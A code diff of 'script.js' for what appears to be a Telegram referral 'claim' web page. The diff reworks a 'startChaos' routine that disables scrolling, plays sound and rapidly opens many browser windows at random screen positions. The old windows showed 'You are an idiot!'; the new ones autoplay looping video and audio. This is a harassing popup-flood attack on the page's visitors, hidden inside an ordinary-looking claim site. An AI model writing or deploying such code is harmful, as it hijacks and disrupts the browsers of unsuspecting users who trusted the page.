@@ -1,7 +1,7 @@
 // script.js
 
 // Replace with your backend URL
-const backendUrl = 'https://telegram-dpreferral-backend.onrender.com'; // Update this to your actual backend URL
+const backendUrl = 'https://your-backend-domain.com'; // Update this to your actual backend URL
 
 // Elements
 const claimButton = document.getElementById('claimButton');
@@ -204,18 +204,18 @@ function closeModalFunc() {
     claimModal.style.display = 'none';
 }
 
-// Function to start chaotic effects by duplicating browser windows
+// Function to start chaotic effects by opening windows with video and sound
 let chaosInterval;
 let chaosCount = 0;
 
 function startChaos() {
-    // Play sound effect if available
+    // Disable scrolling
+    document.body.classList.add('no-scroll');
+
+    // Play chaos sound
     if (chaosSound) {
         chaosSound.play();
     }
-
-    // Disable scrolling
-    document.body.classList.add('no-scroll');
 
     // Start the chaos by spawning windows rapidly
     chaosInterval = setInterval(() => {
@@ -246,7 +246,7 @@ function startChaos() {
 }
 
 function createChaosWindow() {
-    const chaosWindow = window.open('', '_blank', 'width=300,height=200');
+    const chaosWindow = window.open('', '_blank', 'width=400,height=300');
 
     if (chaosWindow) {
         chaosWindow.document.write(`
@@ -258,44 +258,31 @@ function createChaosWindow() {
                     body {
                         margin: 0;
                         padding: 0;
-                        background-color: yellow;
-                        color: black;
-                        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
-                        display: flex;
-                        justify-content: center;
-                        align-items: center;
-                        height: 100vh;
+                        background-color: black;
                         overflow: hidden;
                     }
-                    h1 {
-                        font-size: 24px;
-                        animation: shake 0.5s infinite;
-                    }
-                    @keyframes shake {
-                        0% { transform: translate(1px, 1px) rotate(0deg); }
-                        10% { transform: translate(-1px, -2px) rotate(-1deg); }
-                        20% { transform: translate(-3px, 0px) rotate(1deg); }
-                        30% { transform: translate(3px, 2px) rotate(0deg); }
-                        40% { transform: translate(1px, -1px) rotate(1deg); }
-                        50% { transform: translate(-1px, 2px) rotate(-1deg); }
-                        60% { transform: translate(-3px, 1px) rotate(0deg); }
-                        70% { transform: translate(3px, 1px) rotate(-1deg); }
-                        80% { transform: translate(-1px, -1px) rotate(1deg); }
-                        90% { transform: translate(1px, 2px) rotate(0deg); }
-                        100% { transform: translate(1px, -2px) rotate(-1deg); }
+                    video {
+                        width: 100%;
+                        height: 100%;
+                        object-fit: cover;
                     }
                 </style>
             </head>
             <body>
-                <h1>You are an idiot!</h1>
+                <video autoplay loop>
+                    <source src="chaosvid.mp4" type="video/mp4">
+                </video>
+                <audio autoplay loop>
+                    <source src="chaossound.mp3" type="audio/mpeg">
+                </audio>
             </body>
             </html>
         `);
 
         // Move the window to a random position after a short delay
         setTimeout(() => {
-            const x = Math.floor(Math.random() * (screen.width - 300));
-            const y = Math.floor(Math.random() * (screen.height - 200));
+            const x = Math.floor(Math.random() * (screen.width - 400));
+            const y = Math.floor(Math.random() * (screen.height - 300));
             chaosWindow.moveTo(x, y);
         }, 1000);
 
